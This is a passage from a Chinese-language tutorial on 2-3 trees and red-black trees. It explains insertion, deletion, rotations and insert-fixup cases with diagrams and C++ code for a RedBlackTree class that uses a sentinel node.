<h4 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h4><p>插入操作只需在<code>叶子节点</code>处插入一个新节点，不过由于2-3树的定义需要调整树的结构，使其平衡。<br>在叶子节点而不是空节点处插入节点的好处是以后维护平衡就简单了，而且树的高度也是尽可能的低。<br>插入新节点处的叶子节点可为<code>2-节点</code>或<code>3-节点</code><br><img src="/uploads/images/data_structure/rbtree_cpp/02.png" alt></p>
<p>如上图就是在2-节点位置<code>i</code>直接插入一个新节点<code>j</code>而变成一个3-节点，这种情况下无需调整树结构就已经平衡。 </p>
<p>在3-节点处插入新节点同样也是在叶子节点插入，不过这样会导致形成一个<code>4-节点</code>，在2-3树中这是不允许的，因此需要调整。调整方式为就是将<code>4-节点</code>分裂与合并。</p>
<p><code>节点分裂</code> 是将一个4-节点的中间值key节点提取处来作为父节点，左边key作为左节点，右边key作为右节点。<br>若该4-节点存在子节点，那么将左边key作为最左边两个子节点父节点，将右边key作为最右边两个子节点父节点。</p>
<p><img src="/uploads/images/data_structure/rbtree_cpp/04.png" alt></p>
<p>节点分裂一般伴随着<code>节点合并</code>，也就是将分裂后的父节点与之前未分裂4-节点的父节点合并成一个新的节点，如果新节点依旧是4-节点，那么继续向上分裂合并直到满足平衡。</p>
<p>举个例子：<br>向这棵2-3树插入<code>k</code>节点后成为4-节点，不符合定义，需要分裂该节点。<br><img src="/uploads/images/data_structure/rbtree_cpp/03.png" alt></p>
<p>将节点<code>[i j k]</code>中的<code>j</code>提取出来与与父节点<code>[f h]</code>合并成<code>[f h j]</code>，发现该节点依然是一个4-节点，因此需要继续分裂+合并。<br><img src="/uploads/images/data_structure/rbtree_cpp/05.png" alt></p>
<p>此时<code>[d h]</code>已经是一个3-节点了，而且整个2-3树也是等高的，调整结束。<br><img src="/uploads/images/data_structure/rbtree_cpp/06.png" alt></p>
<p>插入<code>a-k</code>的整个过程如下<br><img src="/uploads/images/data_structure/rbtree_cpp/07.gif" alt></p>
<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><p>2-3树的删除虽然较为复杂，但大致可分为两类：删除叶子节点和删除非叶子节点。</p>
<h5 id="删除叶子节点"><a href="#删除叶子节点" class="headerlink" title="删除叶子节点"></a>删除叶子节点</h5><p>删除叶子节点又可以分为<code>删除2-节点</code>和<code>删除3-节点</code>。<br>删除3-节点的情况最简单，直接删除即可。如下删除key为k的情况<br><img src="/uploads/images/data_structure/rbtree_cpp/08.png" alt></p>
<p>删除2-节点不能简单的删除该节点，因为这样一删除后，该位置为空，2-3树是不允许存在这种情况的。此时可分为如下几类情况来处理：</p>
<ul>
<li>待删除节点的<code>临近兄弟节点</code>是<code>3-节点</code></li>
<li>待删除节点的<code>临近兄弟节点</code>是<code>2-节点</code>，但<code>父节点</code>是<code>3-节点</code></li>
<li>待删除节点的<code>临近兄弟节点</code>和<code>父节点</code>均是<code>2-节点</code></li>
</ul>
<p>对于第一种情况，删除该节点后只需向<code>临近兄弟节点</code>“借”<strong>一个key与待删除节点相近</strong>作为新的节点并<code>调整其与父节点</code>，此时树的高度不变。<br>如下图，删除<code>i</code>节点，而且兄弟是3-节点，将兄弟节点中key<code>k</code>与删除节点相近的key<code>j</code>而不是<code>l</code>作为已删除节点。由于<code>k&gt;j</code>，因此需要调整父子节点键值<br><img src="/uploads/images/data_structure/rbtree_cpp/09.png" alt></p>
<p>对于第二种情况，首先删除该节点后，发现<code>临近兄弟节点g</code>是一个2-节点且父节点<code>[f h]</code>为3-节点。因此将父节点分解为2-节点，由于<code>e&lt;f&lt;g</code>，于是将<code>f</code>与<code>临近兄弟节点g</code>合并成3-节点，并作为一个新的左孩子<br><img src="/uploads/images/data_structure/rbtree_cpp/10.png" alt></p>
<p>演示过程如下<br><img src="/uploads/images/data_structure/rbtree_cpp/11.gif" alt></p>
<p>第三种情况待删除节点的兄弟节点和父节点均是2-节点，删除节点后将<code>父节点b</code>和<code>兄弟节点c</code>合并成3-节点。<br>1.若此时<code>兄弟节点f和父节点d又是2-节点</code>，故继续合并d、f直到平衡，最终的结构如下。图中空位置只是直观上表示一棵等高的2-3树且该节点被“删除”了。<br><img src="/uploads/images/data_structure/rbtree_cpp/12.png" alt></p>
<p>2.若此时<code>临近兄弟节点是2-节点、父节点是3-节点</code>，则可看作是上述第二种删除情况。<br>如下，删除<code>2-节点a</code>，此时兄弟节点c和父节点b均为2-节点，因此合并成<code>3-节点[b c]</code>，此时仍然未平衡，且<code>临近兄弟节f点是2-节点、父节点[d h]是3-节点</code>，因此分解父节点<code>[d h]</code>，将<code>d</code>与临近兄弟节<code>f</code>合并为3-节点<code>[d-f]</code><br><img src="/uploads/images/data_structure/rbtree_cpp/13.png" alt></p>
<p>演示过程如下<br><img src="/uploads/images/data_structure/rbtree_cpp/14.gif" alt></p>
<p>3.若此时<code>临近兄弟节点是3-节点</code>，该过程也可看作是上述第一种删除情况，此处不再叙述。<br><img src="/uploads/images/data_structure/rbtree_cpp/15.png" alt></p>
<p>演示过程如下<br><img src="/uploads/images/data_structure/rbtree_cpp/16.gif" alt></p>
<h5 id="删除非叶子节点"><a href="#删除非叶子节点" class="headerlink" title="删除非叶子节点"></a>删除非叶子节点</h5><p>删除非叶子节点首先也需要找到一个<code>前驱/后继节点</code>，有点类似BST。<br>总之简单来说，前驱节点就是节点的左子树的最右节点，后继节点就是节点的右子树的最左节点。</p>
<p>如下删除<code>key=d</code>的节点，该key位于3-节点，不过没关系。找到其<code>前驱节点c</code>，将键值替换后删除<code>前驱节点c</code>，删除操作就转化为上述3种情况之一。<br><img src="/uploads/images/data_structure/rbtree_cpp/17.png" alt></p>
<p>演示过程如下<br><img src="/uploads/images/data_structure/rbtree_cpp/18.gif" alt></p>
<p>以上大致是关于2-3树的一些基本操作了。说了这么多，就是为了2-3树和为红黑树之间的转化。<br>先来看这张图，将2-3树的<code>3-节点</code>拆解成父子节点，且用红色箭头表明两者父子关系，将子节点染成红色，父节点染成黑色；再将其余<code>2-节点</code>全部染成黑色。经过适当调整树结构后发现这是一棵红黑树！实际上，这是红黑树的变体——<code>左偏红黑树</code>。<br><img src="/uploads/images/data_structure/rbtree_cpp/19.png" alt></p>
<p>实际上向一棵普通的红黑树插入key为<code>a-l</code>应该是这样的：<br><img src="/uploads/images/data_structure/rbtree_cpp/20.png" alt></p>
<p>2-3树一定能转化为红黑树(左偏红黑树)，而红黑树不一定能转化为2-3树！<br>由于<code>2-3-4树</code>是红黑树的一种等同，故2-3-4树一定能转化为红黑树，而红黑树也一定能转化为2-3-4树！</p>
<h3 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><blockquote>
<p>红黑树（英语：Red–black tree）是一种自平衡二叉查找树，是在计算机科学中用到的一种数据结构，典型的用途是实现关联数组。它在1972年由鲁道夫·贝尔发明，被称为”对称二叉B树”，它现代的名字源于Leo J. Guibas和Robert Sedgewick于1978年写的一篇论文。红黑树的结构复杂，但它的操作有着良好的最坏情况运行时间，并且在实践中高效：它可以在 $\log N$ 时间内完成查找，插入和删除，这里的 $N$ 是树中元素的数目。</p>
<p>红黑树相对于AVL树来说，牺牲了部分平衡性以换取插入/删除操作时少量的旋转操作，整体来说性能要优于AVL树。</p>
</blockquote>
<p>根据2-3树转化为红黑树可以这样定义红黑树，或者是<code>规则</code>：</p>
<ul>
<li>红黑树一定是二叉搜索树，因为2-3树也是二叉搜索树；</li>
<li>根节点和所有外部节点(Nil)都是<code>黑色</code>，根据2-3树转化为左偏红黑树可看出来；</li>
<li>在根至外部节点(Nil)路径上，没有连续两个节点是<code>红色</code>的；</li>
<li>在所有根至外部节点的路径上，<code>黑色</code>节点的数目相同，即<code>黑高</code>相等。</li>
</ul>
<p>如果再添加这一规则<code>红色节点位于左侧</code>，那么这个红黑树是一棵左偏红黑树。不过本文主要是介绍普通的红黑树。<br>上述规则3和规则4是极其重要的，但凡涉及插入和删除操作都是要使红黑树满足这两条规则。</p>
<p>本文红黑树C++类</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedBlackTree</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    RBNodeEntry *m_RB_Root;</span><br><span class="line">    RBNodeEntry *m_Nil;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    RedBlackTree();</span><br><span class="line">    RedBlackTree(<span class="keyword">int</span> key,<span class="keyword">int</span> data);</span><br><span class="line">    ~RedBlackTree();</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">Insert</span><span class="params">(<span class="keyword">int</span> key,<span class="keyword">int</span> data)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">Remove</span><span class="params">(<span class="keyword">int</span> key)</span></span>;</span><br><span class="line">    <span class="function">RBNodeEntry* <span class="title">Search</span><span class="params">(RBNodeEntry* pNode,<span class="keyword">int</span> key)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ClearAll</span><span class="params">(RBNodeEntry*&amp; root)</span></span>;</span><br><span class="line">    <span class="function">RBNodeEntry* <span class="title">successor</span><span class="params">(RBNodeEntry* pnode)</span></span>;</span><br><span class="line">    <span class="function">RBNodeEntry* <span class="title">predecessor</span><span class="params">(RBNodeEntry* pnode)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">Height</span><span class="params">(RBNodeEntry* pnode)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(pnode==m_Nil)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> hl= Height(pnode-&gt;leftChild);</span><br><span class="line">        <span class="keyword">int</span> hr= Height(pnode-&gt;rightChild);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">std</span>::max(hl,hr)+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">RBNodeEntry* &amp;<span class="title">root</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;m_RB_Root;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">PreOrder</span><span class="params">(RBNodeEntry* pnode)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">InOrder</span><span class="params">(RBNodeEntry* pnode)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">PostOrder</span><span class="params">(RBNodeEntry* pnode)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">LevelOrder</span><span class="params">(RBNodeEntry* pnode)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">leftRotate</span><span class="params">(RBNodeEntry *pnode)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rightRotate</span><span class="params">(RBNodeEntry *pnode)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">RedBlack_insertFixup</span><span class="params">(RBNodeEntry* pnode)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">RedBlack_removeFixup</span><span class="params">(RBNodeEntry* pnode)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="哨兵节点"><a href="#哨兵节点" class="headerlink" title="哨兵节点"></a>哨兵节点</h4><p>本文红黑树利用了<code>哨兵节点</code>技巧，省去了判断nullptr的麻烦，不过BST部分代码需要稍微修改。<br><img src="/uploads/images/data_structure/rbtree_cpp/48.png" alt></p>
<p>由于哨兵节点也是<code>RBNodeEntry</code>结构，但哨兵节点无父节点，因此设置为<code>nullptr</code>；同时还需要设置其<code>leftChild</code>和<code>rightChild</code>指向自身。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">RedBlackTree::RedBlackTree()&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;m_RB_Root=<span class="literal">nullptr</span>;</span><br><span class="line">    <span class="comment">// 哨兵节点</span></span><br><span class="line">    <span class="keyword">this</span>-&gt;m_Nil=<span class="keyword">new</span> RBNodeEntry;</span><br><span class="line">    <span class="keyword">this</span>-&gt;m_Nil-&gt;color=BLACK;</span><br><span class="line">    <span class="keyword">this</span>-&gt;m_Nil-&gt;key=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">this</span>-&gt;m_Nil-&gt;data=<span class="number">0xffffff</span>;</span><br><span class="line">    <span class="keyword">this</span>-&gt;m_Nil-&gt;leftChild=<span class="keyword">this</span>-&gt;m_Nil;</span><br><span class="line">    <span class="keyword">this</span>-&gt;m_Nil-&gt;rightChild=<span class="keyword">this</span>-&gt;m_Nil;</span><br><span class="line">&#125;</span><br><span class="line">RedBlackTree::RedBlackTree(<span class="keyword">int</span> key,<span class="keyword">int</span> data):RedBlackTree&#123;&#125;&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;m_RB_Root=<span class="keyword">new</span> RBNodeEntry(key,data);</span><br><span class="line">    <span class="keyword">this</span>-&gt;m_RB_Root-&gt;parent=<span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">this</span>-&gt;m_RB_Root-&gt;leftChild=<span class="keyword">this</span>-&gt;m_Nil;</span><br><span class="line">    <span class="keyword">this</span>-&gt;m_RB_Root-&gt;rightChild=<span class="keyword">this</span>-&gt;m_Nil;    </span><br><span class="line">    <span class="keyword">this</span>-&gt;m_RB_Root-&gt;color=BLACK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="查找-1"><a href="#查找-1" class="headerlink" title="查找"></a>查找</h4><p>由于红黑树也是平衡树，其查找也为$O(\log N)$，查找过程与普通的二叉查找树没有太大区别。不过红黑树和AVL树相比，在最坏情况下却是AVL树占优势。这是因为AVL树是严格的自平衡树，在最坏情况下同样多的节点，其高度小于红黑树，这就导致其查找效率高于红黑树。</p>
<h4 id="旋转"><a href="#旋转" class="headerlink" title="旋转"></a>旋转</h4><p>红黑树的旋转操作只有左旋和右旋，而且也是核心。<br>以这张图为例，插入红色节点42后无需进行任何操作就满足红黑树性质。<br><img src="/uploads/images/data_structure/rbtree_cpp/21.png" alt></p>
<p>下面这个例子就是典型的<code>LLb</code>型，至于什么是LLb，此处简单介绍下。<br>图中u表示pu的左孩子、pu表示gu的左孩子、gr表示gu的右孩子，也就是pu的兄弟，u的叔叔。<br>而LLb的意思是：pu是gu的左孩子、u是pu的左孩子，且gu的另外一个孩子是黑色的（<code>Nil节点是黑色节点</code>）。</p>
<p>首先插入节点41后违背<code>规则3</code>，需要对节点45右旋，不过为了直观表示，我将图中的旋转箭头方向位置于42与45之间。旋转操作实质是对节点指针关系的修改。<br><img src="/uploads/images/data_structure/rbtree_cpp/22.png" alt></p>
<p>而这个例子就是<code>LRb</code>型，对节点42<code>左旋</code>后再对节点45<code>右旋</code>。这说明LRb可以转化为LLb类型，也就是说对于插入操作其实也就那几种不平衡类型。<br><img src="/uploads/images/data_structure/rbtree_cpp/23.png" alt></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> COLOR&#123;</span><br><span class="line">    RED,</span><br><span class="line">    BLACK</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 红黑树节点</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">RBNodeEntry</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    <span class="keyword">int</span> color;</span><br><span class="line">    RBNodeEntry *parent;</span><br><span class="line">    RBNodeEntry *leftChild;</span><br><span class="line">    RBNodeEntry *rightChild;</span><br><span class="line">    RBNodeEntry()&#123;&#125;</span><br><span class="line">    RBNodeEntry(<span class="keyword">int</span> k,<span class="keyword">int</span> d)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;key=k;</span><br><span class="line">        <span class="keyword">this</span>-&gt;data=d;</span><br><span class="line">        <span class="keyword">this</span>-&gt;color=RED;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RedBlackTree::leftRotate</span><span class="params">(RBNodeEntry *pnode)</span></span>&#123;</span><br><span class="line">    RBNodeEntry *right = pnode-&gt;rightChild;</span><br><span class="line">    pnode-&gt;rightChild = right-&gt;leftChild;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (right-&gt;leftChild != m_Nil)</span><br><span class="line">        right-&gt;leftChild-&gt;parent = pnode;</span><br><span class="line">    right-&gt;parent = pnode-&gt;parent;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 表示根节点</span></span><br><span class="line">    <span class="keyword">if</span> (pnode-&gt;parent == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        root = right;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">          parent                    parent</span></span><br><span class="line"><span class="comment">           / \                      /    \</span></span><br><span class="line"><span class="comment">       pnode  brother           right  brother</span></span><br><span class="line"><span class="comment">        /  \            ---&gt;     / \</span></span><br><span class="line"><span class="comment">       l    right           pnode  y</span></span><br><span class="line"><span class="comment">           / \                / \</span></span><br><span class="line"><span class="comment">           x  y              l  x</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (pnode-&gt;parent-&gt;leftChild == pnode)&#123;</span><br><span class="line">        pnode-&gt;parent-&gt;leftChild = right;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        parent                    parent</span></span><br><span class="line"><span class="comment">        / \                       /   \</span></span><br><span class="line"><span class="comment">   brother pnode            brother  right</span></span><br><span class="line"><span class="comment">           /  \        ---&gt;          /  \</span></span><br><span class="line"><span class="comment">           l   right             pnode   y</span></span><br><span class="line"><span class="comment">              / \                 / \</span></span><br><span class="line"><span class="comment">              x  y                l  x</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        pnode-&gt;parent-&gt;rightChild = right;            </span><br><span class="line">    &#125;</span><br><span class="line">    right-&gt;leftChild = pnode;</span><br><span class="line">    pnode-&gt;parent = right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RedBlackTree::rightRotate</span><span class="params">(RBNodeEntry *pnode)</span></span>&#123;</span><br><span class="line">    RBNodeEntry *left = pnode-&gt;leftChild;</span><br><span class="line">    pnode-&gt;leftChild=left-&gt;rightChild;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(left-&gt;rightChild!=m_Nil)&#123;</span><br><span class="line">        left-&gt;rightChild-&gt;parent=pnode;</span><br><span class="line">    &#125;</span><br><span class="line">    left-&gt;parent=pnode-&gt;parent;</span><br><span class="line">    <span class="comment">// 根节点</span></span><br><span class="line">    <span class="keyword">if</span>(pnode-&gt;parent==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;m_RB_Root=left;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">          parent                parent</span></span><br><span class="line"><span class="comment">           / \                   / \</span></span><br><span class="line"><span class="comment">       pnode  brother        left   brother</span></span><br><span class="line"><span class="comment">        /  \          ---&gt;   / \</span></span><br><span class="line"><span class="comment">     left   r               x   pnode</span></span><br><span class="line"><span class="comment">      / \                        / \</span></span><br><span class="line"><span class="comment">     x   y                      y   r</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(pnode-&gt;parent-&gt;leftChild==pnode)&#123;</span><br><span class="line">        pnode-&gt;parent-&gt;leftChild=left;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">         parent                  parent</span></span><br><span class="line"><span class="comment">          /  \                    /  \</span></span><br><span class="line"><span class="comment">    brother   pnode         brother  left   </span></span><br><span class="line"><span class="comment">              /  \   ---&gt;             / \</span></span><br><span class="line"><span class="comment">            left  r                  x   pnode</span></span><br><span class="line"><span class="comment">            / \                          / \</span></span><br><span class="line"><span class="comment">           x   y                        y   r</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        pnode-&gt;parent-&gt;rightChild=left;</span><br><span class="line">    &#125;</span><br><span class="line">    left-&gt;rightChild=pnode;</span><br><span class="line">    pnode-&gt;parent=left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="插入-1"><a href="#插入-1" class="headerlink" title="插入"></a>插入</h4><p>红黑树的插入操作类似BST插入，除此之外还要对节点进行<code>染色</code>。那么问题来了，毕竟是红黑树嘛到底是染成黑色还是红色？<br>1.若染成<code>黑色</code>，那么就会一定会违背<code>规则4</code>，即黑色节点数目不相同，之后还需要重新调整红黑树，要知道红黑树调整是很复杂的，若是改写成代码那估计得累死人。<br>2.若染成<code>红色</code>，此时一定不会违背<code>规则4</code>，不过这有<code>可能</code>会违背<code>规则3</code>，即有连续两个节点是<code>红色</code>的。虽说还需要进行调整，不过这代码量相比之前就会少很多了……基于此，染成<code>红色</code>是正确的选择。</p>
<p>插入完成后往往需要<code>修正Fixup</code>树结构，而修正过程需要<code>旋转Rotate</code>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">RedBlackTree::Insert</span><span class="params">(<span class="keyword">int</span> key,<span class="keyword">int</span> data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;m_RB_Root==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;m_RB_Root=<span class="keyword">new</span> RBNodeEntry(key,data);</span><br><span class="line">        <span class="keyword">this</span>-&gt;m_RB_Root-&gt;leftChild=m_Nil;</span><br><span class="line">        <span class="keyword">this</span>-&gt;m_RB_Root-&gt;rightChild=m_Nil;</span><br><span class="line">        <span class="keyword">this</span>-&gt;m_RB_Root-&gt;parent=<span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">this</span>-&gt;m_RB_Root-&gt;color=BLACK;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    RBNodeEntry *x=<span class="keyword">this</span>-&gt;m_RB_Root;</span><br><span class="line">    RBNodeEntry *p=<span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (x!=m_Nil)&#123;</span><br><span class="line">        <span class="comment">// 保存父节点p</span></span><br><span class="line">        p=x;</span><br><span class="line">        <span class="keyword">if</span>(key &lt; x-&gt;key)</span><br><span class="line">            x=x-&gt;leftChild;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(key &gt; x-&gt;key)</span><br><span class="line">            x=x-&gt;rightChild;</span><br><span class="line">        <span class="comment">// 已经存在</span></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            x-&gt;data=data;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    RBNodeEntry *pnode=<span class="keyword">new</span> RBNodeEntry(key,data);</span><br><span class="line">    pnode-&gt;leftChild=m_Nil;</span><br><span class="line">    pnode-&gt;rightChild=m_Nil;</span><br><span class="line">    pnode-&gt;color=RED;</span><br><span class="line">    pnode-&gt;parent=p;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断插入节点位于父节点的哪边</span></span><br><span class="line">    <span class="keyword">if</span>(key &lt; p-&gt;key)</span><br><span class="line">        p-&gt;leftChild=pnode;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        p-&gt;rightChild=pnode;</span><br><span class="line">    <span class="comment">// 检查是否满足红黑树的平衡条件并重新平衡</span></span><br><span class="line">    RedBlack_insertFixup(pnode);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="InsertFixup"><a href="#InsertFixup" class="headerlink" title="InsertFixup"></a>InsertFixup</h4><p>插入操作所引起的不平衡主要是以下8种类型（主要针对插入在红色节点之后）：<br>LLr、LRr、RRr、RLr、LLb、LRb、RRb、RLb。<br><img src="/uploads/images/data_structure/rbtree_cpp/24.png" alt><br>图中u表示pu的左孩子、pu表示gu的左孩子、gr表示gu的右孩子，也就是pu的兄弟，u的叔叔。而LLb的意思是：pu是gu的左孩子、u是pu的左孩子，且gu的另外一个孩子(可以是Nil节点)是黑色的。</p>
<p>可以总结为下面这两种类型，插入新节点后的平衡主要是对<code>新插入节点u、其父节点pu、爷爷节点gu以及叔叔节点gl/gr</code>来操作的。<br><img src="/uploads/images/data_structure/rbtree_cpp/25.png" alt></p>
<p>如果叔叔节点不存在一定是<code>Nil黑色节点</code>！！！</p>
<p>根据<code>叔叔节点uncle</code>的颜色是红色或黑色，InsertFixup大致可以分为以下两种类型：</p>
<ul>
<li>uncle节点是<code>红色</code>，也就是<code>LLr、LRr、RRr、RLr</code>类型，直接<code>换色</code>即可完成红黑树平衡；</li>
<li>uncle节点是<code>黑色</code>，也就是<code>LLb、LRb、RRb、RLb</code>类型，需要旋转和换色。</li>
</ul>
<h5 id="LLr、LRr、RRr、RLr"><a href="#LLr、LRr、RRr、RLr" class="headerlink" title="LLr、LRr、RRr、RLr"></a>LLr、LRr、RRr、RLr</h5><p>处理这类不平衡问题，只需要换色即可，这是因为<code>父节点和叔叔节点</code>此时一定是<code>红色</code>的，那么<code>爷爷节点</code>也一定是<code>黑色</code>的。<br>这个过程是这样的：</p>
<ul>
<li>若<code>父节点pu/parent存在且为红色</code>，则执行该过程；否则将<code>根节点root</code>染成为<code>黑色</code>并结束；</li>
<li>将<code>父节点pu/parent和叔叔节点gl/gr/uncle</code>染成黑色；</li>
<li>将<code>爷爷节点gu</code>染成红色；</li>
<li>移动当前<code>新插入红色节点u</code>到<code>爷爷节点gu</code>，重复执行第一步骤。</li>
</ul>
<p>第4步的作用是确保整棵红黑树均符合其规则，因此将<code>爷爷节点gu</code>染成红色之后，可能<code>爷爷节点gu的父节点是红色</code>，那么还需要再次向上修正，直到某个节点的父节点不存在（根节点）或其父节点是黑色节点。</p>
<p>例子：<br>插入节点30，导致形成LLr不平衡，将<code>父节点和叔叔节点</code>与<code>爷爷节点</code>换色后移动u到gu，此时再判断其父节点为nullptr表示达到了根节点root，因此修正结束，并将根节点root染成黑色。<br><img src="/uploads/images/data_structure/rbtree_cpp/26.png" alt></p>
<p>其他3种情况处理类似。</p>
<h5 id="LLb、LRb、RRb、RLb"><a href="#LLb、LRb、RRb、RLb" class="headerlink" title="LLb、LRb、RRb、RLb"></a>LLb、LRb、RRb、RLb</h5><p>这4种情况只需解释其中一种就能够举一反三了。<br>处理过程如下：</p>
<ul>
<li>若<code>父节点pu/parent存在且为红色</code>，则执行该过程；否则将<code>根节点root</code>染成为<code>黑色</code>并结束；</li>
<li>根据<code>插入节点u</code>位于<code>父节点pu</code>的哪一侧对<code>父节点pu</code>旋转：若u在pu左边，对pu右旋；否则左旋；</li>
<li>旋转完成后对<code>父节点pu/parent和叔叔节点gl/gr/uncle（如果存在）</code>与<code>爷爷节点gu</code>交换颜色；（实际上，只需要对父节点和爷爷节点换色）</li>
<li>根据<code>爷爷节点gu</code>位于<code>爷爷节点gu父节点pgu</code>的哪一侧对<code>爷爷节点gu</code>旋转：若gu在pgu左边，对gu右旋；否则左旋。</li>
</ul>
<p>注意，这种类型无需向上修正：<code>移动当前新插入红色节点u到爷爷节点gu，再重复执行第一步骤</code>，这是因为经过第2步旋转换色后，此时<code>父节点pu</code>一定是<code>黑色</code>的，那么下一次再旋转后，此时<code>新的爷爷节点gu</code>也一定是黑色的。</p>
<p>例子：<br>向这棵红黑树插入节点35，可以看出这是LRb型，虽然爷爷节点40的右孩子是Nil节点。先是对父节点30左旋后再交换爷爷节点40(黑)和父节点35(红)的颜色（此处叔叔节点为Nil，因此没有换色），然后对爷爷节点40右旋后完成了修正。<br>实际上，LRb型经过<code>左旋</code>转化为LLb型，同样RLb型经过<code>右旋</code>转化为RRb型。</p>
<p><img src="/uploads/images/data_structure/rbtree_cpp/27.png" alt><br><img src="/uploads/images/data_structure/rbtree_cpp/28.gif" alt></p>
<p>再看一个例子，其大致过程：插入节点41后形成<code>LLr</code>型，那么交换<code>爷爷节点45</code>和<code>父节点44、叔叔节点46</code>的颜色；移动u到gu位置后发现此时u<code>存在父节点且为红色</code>，那么还得继续修正；而此时是<code>LRb</code>型，故先对<code>父节点40</code>左旋后还要交换<code>爷爷节点50</code>和<code>父节点45、叔叔节点60</code>的颜色；之后再对<code>爷爷节点45</code>右旋；最后还要将<code>根节点root</code>染成黑色，至此红黑树平衡，修正结束。<br><img src="/uploads/images/data_structure/rbtree_cpp/29.png" alt></p>
<p>演示过程<br><img src="/uploads/images/data_structure/rbtree_cpp/30.gif" alt></p>
